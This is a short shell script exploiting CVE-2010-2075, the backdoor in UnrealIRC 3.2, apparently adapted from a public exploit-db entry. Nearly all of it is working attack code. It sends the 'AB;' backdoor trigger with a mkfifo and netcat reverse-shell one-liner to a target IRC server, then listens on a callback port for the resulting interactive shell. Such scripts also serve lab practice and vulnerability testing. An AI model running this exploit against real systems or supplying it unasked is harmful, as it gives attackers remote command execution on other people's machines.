#!/bin/sh
#
# CVE-2010-2075
# Unreal IRC 3.2 Backdoor arbitrary command execution
# https://www.exploit-db.com/exploits/13853
#
# Author: Mason Soroka-Gill
# 
# Netcat version adapted to spawn a reverse shell on the target system.
#
# Note:
#   This relies on the remote host having netcat on the system if this doesn't
#   work, replace nc with telnet in the echo string or use another reverse shell
#

if [ $# -ne 4 ]; then
    echo "Usage:"
    echo "$0 target_ip target_port callback_ip callback_port"
    echo "Example:"
    echo "$0 10.25.100.24 6667 10.25.100.23 7000"
    exit 1
fi

rhost=$1
rport=$2
lhost=$3
lport=$4

(echo "AB; rm /tmp/bd;mkfifo /tmp/bd;cat /tmp/bd|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/bd" | nc $rhost $rport) &
nc -lp $lport

